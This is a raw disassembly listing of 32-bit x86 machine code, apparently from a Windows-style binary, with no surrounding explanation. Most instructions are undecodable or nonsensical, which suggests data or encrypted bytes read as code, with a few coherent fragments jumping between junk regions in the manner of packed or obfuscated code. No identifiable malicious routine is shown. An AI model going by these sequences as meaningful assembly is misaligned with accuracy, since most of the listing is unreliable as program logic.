  40b1ba:	lods   eax,DWORD PTR ds:[esi]
  40b1bb:	push   edx
  40b1bc:	stc    
  40b1bd:	ins    BYTE PTR es:[edi],dx
  40b1be:	int    0x4
  40b1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1c1:	mov    eax,0x206766cc
  40b1c6:	inc    ebx
  40b1c7:	ja     0x40b1a7
  40b1c9:	cmp    bl,BYTE PTR [ebx]
  40b1cb:	aad    0x18
  40b1cd:	fistp  WORD PTR [esi]
  40b1cf:	jb     0x40b163
  40b1d1:	pop    esi
  40b1d2:	push   ebx
  40b1d3:	xor    eax,0xf8b504aa
  40b1d8:	and    esp,ecx
  40b1da:	pop    esi
  40b1db:	sub    al,0x9e
  40b1dd:	xor    eax,0xdf36d584
  40b1e2:	mov    dl,0x75
  40b1e4:	mov    al,ds:0x79ee758a
  40b1e9:	ret    
  40b1ea:	(bad)  
  40b1eb:	push   0x39d07fd6
  40b1f0:	int    0x4
  40b1f2:	test   eax,0xa157a25a
  40b1f7:	xor    DWORD PTR [ecx+0x18c02ec2],0x6481808b
  40b201:	inc    ebp
  40b202:	in     eax,0xe2
  40b204:	mov    edi,0x9e9d3f13
  40b209:	in     eax,dx
  40b20a:	mov    bl,0x3d
  40b20c:	sbb    eax,0xe788a938
  40b211:	imul   edx,DWORD PTR [ebx],0x3604bd0c
  40b217:	mov    esp,0x3c128552
  40b21c:	in     al,dx
  40b21d:	test   eax,0x4724c287
  40b222:	fwait
  40b223:	je     0x60ddbe2f
  40b229:	jmp    0x97f5:0x9fb13c7f
  40b230:	(bad)  
  40b231:	call   0xba0e5780
  40b236:	(bad)  
  40b237:	call   0xec78c9d5
  40b23c:	pop    edx
  40b23d:	xor    DWORD PTR [ebx+0x5],eax
  40b240:	outs   dx,DWORD PTR ds:[esi]
  40b241:	or     ebx,DWORD PTR [ebx+0x43592efb]
  40b247:	push   0x1
  40b249:	ins    DWORD PTR es:[edi],dx
  40b24a:	daa    
  40b24b:	fwait
  40b24c:	cs or  ch,dl
  40b24f:	mov    esp,ebp
  40b251:	dec    esp
  40b252:	jae    0x40b29c
  40b254:	sbb    eax,0x926ed849
  40b259:	ret    
  40b25a:	pop    ecx
  40b25b:	aam    0x43
  40b25d:	retf   
  40b25e:	dec    eax
  40b25f:	mov    edx,0x63cfc4d1
  40b264:	pushf  
  40b265:	ret    0xf5cf
  40b268:	(bad)  
  40b269:	adc    al,0x2
  40b26b:	cmp    DWORD PTR [esi],ebx
  40b26d:	and    DWORD PTR [esi-0x48],eax
  40b270:	rcl    edi,cl
  40b272:	cs mov bl,0xce
  40b275:	retf   0x7557
  40b278:	inc    esp
  40b279:	retf   0x3c1a
  40b27c:	cli    
  40b27d:	mov    ebp,0x9bb97219
  40b282:	xchg   edi,eax
  40b283:	jo     0x40b29a
  40b285:	dec    esp
  40b286:	xchg   ebx,eax
  40b287:	int3   
  40b288:	fidivr WORD PTR [edx-0x2c]
  40b28b:	ds call 0xd931:0x3cf12668
  40b293:	mov    WORD PTR [ecx],?
  40b295:	int    0xba
  40b297:	into   
  40b298:	ja     0x40b25e
  40b29a:	icebp  
  40b29b:	iret   
  40b29c:	mov    eax,0x9b4be56b
  40b2a1:	jnp    0x40b322
  40b2a3:	adc    al,0x37
  40b2a6:	sub    al,0x25
  40b2a8:	sub    eax,DWORD PTR [edi+0x7a]
  40b2ab:	push   esp
  40b2ac:	imul   bh
  40b2ae:	(bad)  
  40b2af:	shl    DWORD PTR [edx+eax*4-0x2a],1
  40b2b3:	loopne 0x40b296
  40b2b5:	adc    BYTE PTR [esi],bl
  40b2b7:	pusha  
  40b2b8:	dec    ecx
  40b2b9:	xchg   edx,ebp
  40b2bb:	add    al,0x8
  40b2bd:	(bad)  
  40b2be:	mov    edi,cr5
  40b2c1:	pop    ecx
  40b2c2:	mov    ebp,0xdd91cf3f
  40b2c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2c8:	sub    eax,0x9c5e4d3c
  40b2cd:	add    BYTE PTR [ecx+0x5318190d],0x35
  40b2d4:	adc    BYTE PTR [ecx+0x55],0x39
  40b2d8:	dec    ecx
  40b2d9:	(bad)  
  40b2da:	dec    ebp
  40b2db:	push   0x4625462a
  40b2e0:	scas   eax,DWORD PTR es:[edi]
  40b2e1:	or     bl,BYTE PTR [eax-0x2b]
  40b2e4:	sub    DWORD PTR [ebp-0x29661254],esi
  40b2ea:	(bad)  
  40b2eb:	xchg   esi,eax
  40b2ec:	push   esi
  40b2ed:	bound  edx,QWORD PTR [ecx]
  40b2ef:	aam    0xf9
  40b2f1:	test   DWORD PTR [eax],ebp
  40b2f3:	mov    ebx,0x74bab4f7
  40b2f8:	rol    cl,cl
  40b2fa:	int3   
  40b2fb:	sbb    eax,0x153d60b2
  40b300:	clc    
  40b301:	push   0xf1046864
  40b306:	(bad)  
  40b308:	xor    eax,0xd97a196e
  40b30d:	pop    esi
  40b30e:	std    
  40b30f:	mov    ds:0x8e39e4f6,al
  40b314:	inc    ecx
  40b315:	repz add al,0x2e
  40b318:	add    cl,BYTE PTR [eax]
  40b31a:	std    
  40b31b:	cli    
  40b31c:	sub    al,0xda
  40b31e:	sbb    BYTE PTR [ebp+0x24b88e6a],ah
  40b324:	mov    ebp,0x4ee00990
  40b329:	mov    bh,0xf2
  40b32b:	push   ebx
  40b32c:	sub    eax,0x72eb6f2
  40b331:	jmp    0x40b365
  40b333:	stos   DWORD PTR es:[edi],eax
  40b334:	adc    eax,0x1ab92a72
  40b339:	push   ds
  40b33a:	jbe    0x40b3ba
  40b33c:	outs   dx,BYTE PTR ds:[esi]
  40b33d:	mov    dl,0x3f
  40b33f:	or     DWORD PTR [ecx],esi
  40b341:	mov    bh,0x5d
  40b343:	xlat   BYTE PTR ds:[ebx]
  40b344:	or     DWORD PTR [edx],esi
  40b346:	fisttp DWORD PTR [edi]
  40b348:	rcl    DWORD PTR [ebx+0x3e3f6f27],1
  40b34e:	fcmovb st,st(6)
  40b350:	cmp    cl,BYTE PTR [eax-0x14]
  40b353:	add    BYTE PTR [edi],al
  40b355:	arpl   WORD PTR [ebx-0x6b],bp
  40b358:	mov    bh,0xbe
  40b35a:	jp     0x40b398
  40b35c:	rep data16 outs dx,BYTE PTR ds:[esi]
  40b35f:	fdivrp st(0),st
  40b361:	add    eax,0xebf25367
  40b366:	jle    0x40b39a
  40b368:	jmp    0x40b38f
  40b36a:	mov    bh,0x58
  40b36c:	jle    0x40b2f5
  40b36e:	xor    eax,0x3e96af4f
  40b373:	int    0xfa
  40b375:	mov    edx,0x6151a3b5
  40b37a:	loopne 0x40b308
  40b37c:	loopne 0x40b3bc
  40b37e:	push   ebp
  40b37f:	mov    ah,0x35
  40b381:	in     eax,dx
  40b382:	fdivr  QWORD PTR [ecx]
  40b384:	cwde   
  40b385:	add    dl,BYTE PTR [eax]
  40b387:	fwait
  40b388:	xchg   esi,eax
  40b389:	fsub   DWORD PTR [edi-0x5df5316e]
  40b38f:	nop
  40b390:	mov    ah,0x69
  40b392:	fcomp  DWORD PTR [ecx+ebx*4]
  40b395:	cmc    
  40b396:	es push eax
  40b398:	add    ebp,DWORD PTR [edx]
  40b39a:	jecxz  0x40b32c
  40b39c:	outs   dx,DWORD PTR ds:[esi]
  40b39d:	loop   0x40b351
  40b39f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3a0:	and    DWORD PTR [eax+0x44dffd62],0x332eb6c5
  40b3aa:	test   al,0x9f
  40b3ac:	cmc    
  40b3ad:	sbb    eax,DWORD PTR [ebp+0x77d652ed]
  40b3b3:	inc    ecx
  40b3b4:	push   esi
  40b3b5:	add    DWORD PTR [ebx+0x5e6e1140],0x5a
  40b3bc:	xor    BYTE PTR [esi-0x12],0x29
  40b3c0:	scas   al,BYTE PTR es:[edi]
  40b3c1:	pushf  
  40b3c2:	daa    
  40b3c3:	cli    
  40b3c4:	pop    ebx
  40b3c5:	push   ebp
  40b3c6:	pop    edi
  40b3c7:	cmp    al,0xce
  40b3c9:	dec    BYTE PTR [esi+0x318748c7]
  40b3cf:	nop
  40b3d0:	pop    esp
  40b3d1:	mov    ch,0x8
  40b3d3:	div    dh
  40b3d5:	dec    ecx
  40b3d6:	rol    DWORD PTR [edx+0x53],cl
  40b3d9:	adc    eax,0x7ad819d9
  40b3de:	das    
  40b3df:	pop    ecx
  40b3e0:	mov    WORD PTR [ebp-0x3f],es
  40b3e3:	sub    BYTE PTR [esp+edi*1],al
  40b3e6:	xchg   BYTE PTR [ebx-0x29],bh
  40b3e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3ea:	mov    dh,0x2
  40b3ec:	mov    BYTE PTR [esi+0x76b3ade],cl
  40b3f2:	jnp    0x40b3ae
  40b3f4:	push   es
  40b3f5:	out    0x2d,al
  40b3f7:	sar    BYTE PTR [edx-0x3028467b],cl
  40b3fd:	fild   QWORD PTR [edx]
  40b3ff:	cld    
  40b400:	push   ss
  40b401:	aas    
  40b402:	cmp    eax,0xca94e36f
  40b407:	or     dh,BYTE PTR [esi+0x41]
  40b40a:	push   edi
  40b40b:	jbe    0x40b3d4
  40b40d:	jbe    0x40b452
  40b40f:	sbb    BYTE PTR [edi+0x51],bl
  40b412:	mov    ebx,0x39261bb6
  40b417:	push   esi
  40b418:	nop
  40b419:	sahf   
  40b41a:	adc    DWORD PTR [eax-0x7cfd2a80],0xd416179
  40b424:	cmp    DWORD PTR [esi],ecx
  40b426:	test   BYTE PTR [ebx],bh
  40b428:	rcr    BYTE PTR [eax],1
  40b42a:	push   0xfffffffd
  40b42c:	stc    
  40b42d:	jb     0x40b421
  40b42f:	mov    ss,WORD PTR [esi-0x5d]
  40b432:	jge    0x40b49d
  40b434:	mov    dh,BYTE PTR [eax-0x713e8f98]
  40b43a:	cmc    
  40b43b:	push   0x6ef42e69
  40b440:	popf   
  40b441:	add    DWORD PTR [edx],edx
  40b443:	(bad)  
  40b444:	jnp    0x40b409
  40b446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b447:	jmp    0x40b44c
  40b449:	into   
  40b44a:	popa   
  40b44b:	cmp    DWORD PTR [edi+0x9],eax
  40b44e:	ins    BYTE PTR es:[edi],dx
  40b44f:	mov    eax,0x111a0f15
  40b454:	aam    0xbd
  40b456:	mov    ds:0x7924de83,eax
  40b45b:	adc    dh,dh
  40b45d:	inc    esp
  40b45e:	add    BYTE PTR [ecx-0x39b46b89],al
  40b464:	sbb    eax,0xd160101a
  40b469:	sub    edx,DWORD PTR [eax+0x7a6132c7]
  40b46f:	sar    DWORD PTR ds:0x65702623,1
  40b475:	sbb    ebx,edi
  40b477:	repz xor DWORD PTR [ecx+0x488965a1],ebp
  40b47e:	jg     0x40b432
  40b480:	jg     0x40b474
  40b482:	les    ebx,FWORD PTR [edi+ebx*4-0x6bc665d0]
  40b489:	pusha  
  40b48a:	in     eax,dx
  40b48b:	adc    dh,ch
  40b48d:	mov    ecx,0xebd59794
  40b492:	add    BYTE PTR [eax+0x58e4bdde],ch
  40b498:	enter  0xf8f1,0x84
  40b49c:	scas   al,BYTE PTR es:[edi]
  40b49d:	jbe    0x40b448
  40b49f:	dec    ebx
  40b4a0:	in     al,0xfc
  40b4a2:	add    al,0xf5
  40b4a4:	ja     0x40b46e
  40b4a6:	ret    
  40b4a7:	dec    ecx
  40b4a8:	ins    BYTE PTR es:[edi],dx
  40b4a9:	push   ss
  40b4aa:	fcom   st(5)
  40b4ac:	jae    0x40b458
  40b4ae:	retf   0x1dce
  40b4b1:	adc    DWORD PTR [esi+0x2d],ebp
  40b4b4:	jmp    0x40b4b8
  40b4b6:	xor    BYTE PTR [ebx+0x31],0x4d
  40b4ba:	call   DWORD PTR [eax+0xae0ce2a]
  40b4c0:	lea    ebx,[edx-0x694d8c1]
  40b4c6:	xchg   edx,eax
  40b4c7:	nop
  40b4c8:	ret    0x9b52
  40b4cb:	adc    al,BYTE PTR [esi+0x29]
  40b4ce:	(bad)  
  40b4cf:	xchg   ecx,eax
  40b4d0:	xor    eax,0x6006497
  40b4d5:	xor    al,0xf7
  40b4d7:	jo     0x40b48e
  40b4d9:	or     DWORD PTR [ebx-0x26],esp
  40b4dc:	mov    ?,WORD PTR [eax]
  40b4de:	call   0xb50e:0xdb3f962f
  40b4e5:	ds in  al,0xe0
  40b4e8:	sbb    al,0x99
  40b4ea:	jbe    0x40b48a
  40b4ec:	dec    ecx
  40b4ed:	mov    dl,0x88
  40b4ef:	jmp    0x40b543
  40b4f1:	dec    ebp
  40b4f2:	rcr    BYTE PTR [ecx-0x1895f444],1
  40b4f8:	dec    ecx
  40b4f9:	fdivr  st(2),st
  40b4fb:	lahf   
  40b4fc:	test   BYTE PTR [ecx],dl
  40b4fe:	mov    edx,0x6597a20
  40b503:	les    ebp,FWORD PTR [si]
  40b506:	and    bl,BYTE PTR ds:0xe207755c
  40b50c:	jae    0x40b50e
  40b50e:	jle    0x40b503
  40b510:	sub    bl,cl
  40b512:	addr16 (bad) 
  40b514:	das    
  40b515:	scas   al,BYTE PTR es:[edi]
  40b516:	xchg   esi,eax
  40b517:	fstp   QWORD PTR [edx-0x48dae8eb]
  40b51d:	sub    DWORD PTR [esi-0x34],ebp
  40b520:	imul   edx,edi
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	adc    bh,BYTE PTR [eax]
  40b551:	mov    cx,0x7086
  40b556:	jo     0x40b4f7
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b59d
  40b55c:	mov    ds:0xd8bb87e0,al
  40b561:	sbb    eax,DWORD PTR [eax]
  40b563:	push   ebx
  40b564:	mov    ecx,0x5bddeed9
  40b569:	xor    al,BYTE PTR [ebx-0x42]
  40b56c:	pop    ebp
  40b56d:	scas   eax,DWORD PTR es:[edi]
  40b56e:	int3   
  40b56f:	rcr    DWORD PTR [edx-0x6c7df011],cl
  40b575:	loop   0x40b5e3
  40b577:	fmulp  st(1),st
  40b579:	jg     0x40b5aa
  40b57b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b57c:	rcl    ebx,cl
  40b57e:	(bad)  
  40b57f:	jno    0x40b5ee
  40b581:	dec    eax
  40b582:	pop    ebp
  40b583:	in     al,0xbe
  40b585:	adc    eax,0x13ad3a73
  40b58a:	jb     0x40b55f
  40b58c:	clc    
  40b58d:	xor    al,0x8d
  40b58f:	mov    dh,0x3c
  40b591:	xchg   ebx,eax
  40b592:	(bad)  
  40b593:	xchg   edi,eax
  40b594:	adc    ebx,DWORD PTR [esi]
  40b596:	pop    edx
  40b597:	ret    0x4179
  40b59a:	ins    DWORD PTR es:[edi],dx
  40b59b:	sti    
  40b59c:	int3   
  40b59d:	fst    QWORD PTR [ebp+ebp*4-0x30]
  40b5a1:	sub    eax,0xf9ca1b50
  40b5a6:	pcmpgtd mm6,QWORD PTR [eax]
  40b5a9:	in     eax,dx
  40b5aa:	fidiv  DWORD PTR [bp-0x6d]
  40b5ae:	xor    DWORD PTR [edx],eax
  40b5b0:	iret   
  40b5b1:	pusha  
  40b5b2:	push   edx
  40b5b3:	call   0x570de69f
  40b5b8:	pushf  
  40b5b9:	add    eax,0x36c5d12e
  40b5be:	mov    dh,0x33
  40b5c0:	mov    ch,0xfa
  40b5c2:	pushf  
  40b5c3:	imul   eax,edx,0x2
  40b5c6:	lahf   
  40b5c7:	sub    eax,0xbc23af02
  40b5cc:	jl     0x40b5fb
  40b5ce:	in     al,0x5e
  40b5d0:	shr    DWORD PTR [ebx],0x4c
  40b5d3:	adc    DWORD PTR [edi],ecx
  40b5d5:	and    ah,BYTE PTR [edx-0x4f3b4b5d]
  40b5db:	(bad)  
  40b5dc:	scas   eax,DWORD PTR es:[edi]
  40b5dd:	and    ebp,DWORD PTR [eax-0x5f3898fb]
  40b5e3:	fmul   st,st(4)
  40b5e5:	test   BYTE PTR [ecx-0x13759b56],ah
  40b5eb:	leave  
  40b5ec:	in     eax,dx
  40b5ed:	xor    eax,0xfe822a55
  40b5f2:	jle    0x40b62d
  40b5f4:	mov    al,BYTE PTR [ebx+0x64904668]
  40b5fa:	stos   DWORD PTR es:[edi],eax
  40b5fb:	ror    DWORD PTR ds:0xc686deca,1
  40b601:	sub    esp,DWORD PTR [edi+0x4d3b585b]
  40b607:	push   ebx
  40b608:	cdq    
  40b609:	and    eax,edx
  40b60b:	add    ebp,ebx
  40b60d:	mov    eax,edi
  40b60f:	xor    cl,bl
  40b611:	sub    cl,ch
  40b613:	lea    esi,[esp-0x4a]
  40b617:	sub    BYTE PTR [ebp-0x5846a063],ch
  40b61d:	test   BYTE PTR [ebp+0x62],dl
  40b620:	sbb    al,0x55
  40b622:	inc    ecx
  40b623:	jmp    0x40b5c2
  40b625:	data16 test al,0x6b
  40b628:	xor    DWORD PTR [ebx-0x40],eax
  40b62b:	and    al,0xed
  40b62d:	inc    edx
  40b62e:	enter  0x6014,0x3f
  40b632:	jmp    0xc4eb:0xa4a7cb78
  40b639:	push   0xae39086a
  40b63e:	in     al,0xde
  40b640:	xor    ecx,esi
  40b642:	jns    0x40b670
  40b644:	js     0x40b681
  40b646:	std    
  40b647:	adc    DWORD PTR [ebx+esi*1-0x1e],ebp
  40b64b:	jae    0x40b6cb
  40b64d:	addr16 mov esi,0x990d48de
  40b653:	mov    cl,0x37
  40b655:	in     al,dx
  40b656:	jne    0x40b655
  40b658:	neg    al
  40b65a:	out    0x91,al
  40b65c:	ret    
  40b65d:	sbb    bh,BYTE PTR [ecx+eiz*1]
  40b660:	dec    esi
  40b661:	ret    
  40b662:	fs inc ebp
  40b664:	and    eax,0x4b498f1e
  40b669:	inc    esp
  40b66a:	rol    BYTE PTR [esi-0x5d40905c],1
  40b670:	adc    eax,0x43519bb8
  40b675:	out    0x2e,eax
  40b677:	pop    ebp
  40b678:	cdq    
  40b679:	hlt    
  40b67a:	jb     0x40b6c5
  40b67c:	jle    0x40b6d7
  40b67e:	test   eax,0x5ae52e9b
  40b683:	lfs    ebx,FWORD PTR [ecx+0x43]
  40b687:	sub    eax,0x47972e78
  40b68c:	xor    al,0x21
  40b68e:	mov    ecx,0xb3c90b66
  40b693:	stos   BYTE PTR es:[edi],al
  40b694:	retf   0xcc90
  40b697:	in     al,dx
  40b698:	enter  0x390e,0x7
  40b69c:	push   ds
  40b69d:	jle    0x40b64f
  40b69f:	push   esp
  40b6a0:	mov    edx,ebp
  40b6a2:	adc    eax,0x508c4711
  40b6a7:	xchg   BYTE PTR [edx+0x1118b0ef],bh
  40b6ad:	push   ebx
  40b6ae:	and    esp,esi
  40b6b0:	inc    ecx
  40b6b1:	pop    ecx
  40b6b2:	push   ebx
  40b6b3:	imul   eax,eax,0x76
  40b6b6:	sub    al,0x91
  40b6b8:	dec    ecx
  40b6b9:	xor    DWORD PTR [esi],0xffffff93
  40b6bc:	out    dx,al
  40b6bd:	call   0xf2fde76
  40b6c2:	jmp    0x8abe6e7e
  40b6c7:	test   DWORD PTR ds:0x99148cc3,0xbfe14391
  40b6d1:	rcr    BYTE PTR [ebp+0x6b6dee52],cl
  40b6d7:	popa   
  40b6d8:	mov    al,0x81
  40b6da:	mov    cl,0x88
  40b6dc:	ins    DWORD PTR es:[edi],dx
  40b6dd:	push   0x21
  40b6df:	aaa    
  40b6e0:	mov    ds:0xd3a113e4,al
  40b6e5:	and    ebp,DWORD PTR [eax]
  40b6e7:	cmp    DWORD PTR [edx],esp
  40b6e9:	inc    ebp
  40b6ea:	rol    DWORD PTR [esi-0x70f31e9f],cl
  40b6f0:	mov    eax,0x26ef3651
  40b6f5:	cld    
  40b6f6:	ds jle 0x40b770
  40b6f9:	mov    eax,ds:0x5545186a
  40b6fe:	dec    ebx
  40b6ff:	fisttp WORD PTR [edi+0x4]
  40b702:	xor    al,0x22
  40b704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b705:	pop    eax
  40b706:	ja     0x40b727
  40b708:	fs mov ebx,0x5ac45aa7
  40b70e:	rcr    BYTE PTR [ebp+edx*2-0x57],1
  40b712:	cmp    BYTE PTR [eax+0x19c66af0],cl
  40b718:	jl     0x40b6bb
  40b71a:	xchg   esp,eax
  40b71b:	fmul   DWORD PTR [edx-0x6e7e1743]
  40b721:	push   esp
  40b722:	nop
  40b723:	pop    ds
  40b724:	or     dl,BYTE PTR [edx]
  40b726:	mov    al,0x74
  40b728:	or     ebp,DWORD PTR [edi+0x5d4e9ac2]
  40b72e:	ins    DWORD PTR es:[edi],dx
  40b72f:	jno    0x40b6ba
  40b731:	(bad)  
  40b732:	sbb    edi,DWORD PTR [esi+ecx*4]
  40b735:	jmp    0xdb9b0a24
  40b73a:	push   edi
  40b73b:	sbb    bl,BYTE PTR [ebx]
  40b73d:	xor    dl,dh
  40b73f:	jp     0x40b794
  40b741:	shl    DWORD PTR [edi+0x13],0x6e
  40b745:	xchg   esp,eax
  40b746:	iret   
  40b747:	or     esp,DWORD PTR [edi]
  40b749:	push   ebp
  40b74a:	pop    edx
  40b74b:	mov    ebp,edx
  40b74d:	loope  0x40b7cd
  40b74f:	jo     0x40b740
  40b751:	mov    ecx,0x658703c7
  40b756:	out    0x54,eax
  40b758:	jge    0x40b6e8
  40b75a:	bound  edx,QWORD PTR [edx]
  40b75c:	xor    ah,ch
  40b75e:	sub    esp,esp
  40b760:	mov    ebp,0x98ca3c14
  40b765:	lahf   
  40b766:	mov    esp,0xb36aa178
  40b76b:	out    0x75,al
  40b76d:	pushf  
  40b76e:	pop    ecx
  40b76f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b770:	mov    edi,0xc123d3e1
  40b775:	push   esp
  40b776:	fldenv [edi-0x35]
  40b779:	sti    
  40b77a:	push   ecx
  40b77b:	dec    ecx
  40b77c:	and    ah,BYTE PTR [esi]
  40b77e:	add    ebp,DWORD PTR [esi]
  40b780:	inc    edx
  40b781:	cld    
  40b782:	ja     0x40b7d5
  40b784:	mov    WORD PTR [ebx],?
  40b786:	cmc    
  40b787:	lahf   
  40b788:	jg     0x40b72a
  40b78a:	stc    
  40b78b:	cmp    dl,ah
  40b78d:	scas   al,BYTE PTR es:[edi]
  40b78e:	call   0x9536:0x51cc1d6d
  40b795:	sbb    dl,ah
  40b797:	setge  BYTE PTR [ebx+ecx*2+0x2a2d77f5]
  40b79f:	aaa    
  40b7a0:	ret    0xe9f0
  40b7a3:	jl     0x40b7b0
  40b7a5:	xchg   DWORD PTR [esi+ecx*1-0x7f],edi
  40b7a9:	jbe    0x40b786
  40b7ab:	xlat   BYTE PTR ds:[ebx]
  40b7ac:	adc    DWORD PTR [edx-0x4],0xa0d68501
  40b7b3:	sbb    dl,BYTE PTR ds:0xaa7c4f77
  40b7b9:	cli    
  40b7ba:	cmp    bl,BYTE PTR [esi+0x3d]
  40b7bd:	cmp    ah,BYTE PTR [esi+ecx*1-0x182a3e70]
  40b7c4:	xchg   ebx,eax
  40b7c5:	sub    al,0x4d
  40b7c7:	and    ebx,ebx
  40b7c9:	pop    ebp
  40b7ca:	mov    bl,0x3e
  40b7cc:	dec    esi
  40b7cd:	(bad)  
  40b7cf:	clc    
  40b7d0:	fstp   QWORD PTR [esi-0x14]
  40b7d3:	mov    eax,0xd843e704
  40b7d8:	in     eax,dx
  40b7d9:	out    dx,eax
  40b7da:	outs   dx,DWORD PTR ds:[esi]
  40b7db:	test   eax,0xb5a619e3
  40b7e0:	ret    0x27ec
  40b7e3:	out    0xbd,eax
  40b7e5:	push   ebp
  40b7e6:	stos   BYTE PTR es:[edi],al
  40b7e7:	stos   DWORD PTR es:[edi],eax
  40b7e8:	lods   al,BYTE PTR ds:[esi]
  40b7e9:	std    
  40b7ea:	test   BYTE PTR [ebx-0x46b70af3],dh
  40b7f0:	jg     0x40b7b9
  40b7f2:	(bad)  
  40b7f3:	icebp  
  40b7f4:	(bad)  
  40b7f5:	sti    
  40b7f6:	ficomp DWORD PTR [esp+edx*2+0x69e32294]
  40b7fd:	jnp    0x40b7db
  40b7ff:	push   ss
  40b800:	neg    DWORD PTR [esi+eax*1-0x573225ec]
  40b807:	lea    ebp,[edx]
  40b809:	shl    DWORD PTR [ebx],0xe7
  40b80c:	adc    al,BYTE PTR [edx-0x2c89d63f]
  40b812:	cs loop 0x40b86c
  40b815:	jle    0x40b7fa
  40b817:	icebp  
  40b818:	mov    esi,0x3de6e350
  40b81d:	jecxz  0x40b825
  40b81f:	dec    ecx
  40b821:	(bad)  
  40b822:	call   0x4c55:0xc563b777
  40b829:	je     0x40b823
  40b82b:	sub    bl,BYTE PTR [eax+0x3]
  40b82e:	add    al,0xa7
  40b830:	push   esi
  40b831:	xchg   DWORD PTR [ebp-0x80],esi
  40b834:	push   ebp
  40b835:	and    DWORD PTR [eax-0x5c4542f3],esp
  40b83b:	mov    al,0xa4
  40b83d:	pop    es
  40b83e:	mov    dh,0xc9
  40b840:	jmp    0xcd88:0x63eb0039
  40b847:	shl    BYTE PTR [esi+0x4fd195ac],0xe6
  40b84e:	js     0x40b856
  40b850:	popa   
  40b851:	cwde   
  40b852:	or     BYTE PTR [edx-0x80],ah
  40b855:	mov    ch,0x9d
  40b857:	(bad)  
  40b858:	icebp  
  40b859:	cs and eax,esi
  40b85c:	jmp    0xe157550b
  40b861:	jb     0x40b81a
  40b863:	in     eax,dx
  40b864:	cmp    cl,cl
  40b866:	sbb    DWORD PTR [eax-0x137ad782],ebx
  40b86c:	hlt    
  40b86d:	pop    ebx
  40b86e:	xor    al,0x39
  40b870:	enter  0x4e10,0xcf
  40b874:	xor    BYTE PTR [ebx],dh
  40b876:	sub    eax,0xcce3f06b
  40b87b:	push   0x64
  40b87d:	push   esi
  40b87e:	std    
  40b87f:	stc    
  40b880:	mov    bl,0xc4
  40b882:	ja     0x40b902
  40b884:	movsx  esp,BYTE PTR [esi-0x19ced578]
  40b88b:	pop    ebp
  40b88c:	push   ebp
  40b88d:	ss hlt 
  40b88f:	das    
  40b890:	push   cs
  40b891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b892:	cmp    BYTE PTR [eax-0x4c23b9f4],ah
  40b898:	(bad)  
  40b899:	jno    0x40b8de
  40b89b:	fisttp DWORD PTR [edx-0x33]
  40b89e:	sub    DWORD PTR [ebp+0x307755f],ecx
  40b8a4:	data16 fsub DWORD PTR cs:[ecx]
  40b8a8:	or     dl,dh
  40b8aa:	int    0xfc
  40b8ac:	div    ah
  40b8ae:	loop   0x40b8d7
  40b8b0:	cmp    ebp,ebx
  40b8b2:	and    BYTE PTR [esi+0x3c],0xa0
  40b8b6:	(bad)
  40b8b9:	cld    
  40b8ba:	xor    eax,0xf0799c6
  40b8bf:	repnz aam 0x64
  40b8c2:	sub    eax,0x13ce0b73
  40b8c7:	inc    esp
  40b8c8:	lock jmp 0x811a5cb6
  40b8ce:	lods   eax,DWORD PTR ds:[esi]
  40b8cf:	jno    0x40b85b
  40b8d1:	js     0x40b93f
  40b8d3:	xchg   esp,eax
  40b8d4:	mov    ?,WORD PTR [esi-0x6d048654]
  40b8da:	dec    ebx
  40b8db:	test   BYTE PTR [edi-0x58fe90e0],0xa5
  40b8e2:	lock mov WORD PTR ss:[esi-0x1c8770a4],es
  40b8ea:	xor    BYTE PTR [ecx+edi*2],dh
  40b8ed:	pop    ebp
  40b8ee:	lods   al,BYTE PTR ds:[esi]
  40b8ef:	es pop edx
  40b8f1:	push   0x69
  40b8f3:	int3   
  40b8f4:	xor    al,0x90
  40b8f6:	ins    DWORD PTR es:[edi],dx
  40b8f7:	push   ebp
  40b8f8:	mov    dh,0x27
  40b8fa:	jne    0x40b8f3
  40b8fc:	mov    edi,DWORD PTR [ebp-0x4]
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x4c59905],cl
  40b949:	pop    eax
  40b94a:	inc    esi
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b9c0
  40b954:	in     al,0x85
  40b956:	aas    
  40b957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b958:	xchg   esi,eax
  40b959:	nop
  40b95a:	lds    ebp,FWORD PTR [edi+0x0]
  40b95d:	add    eax,0xb65fbb86
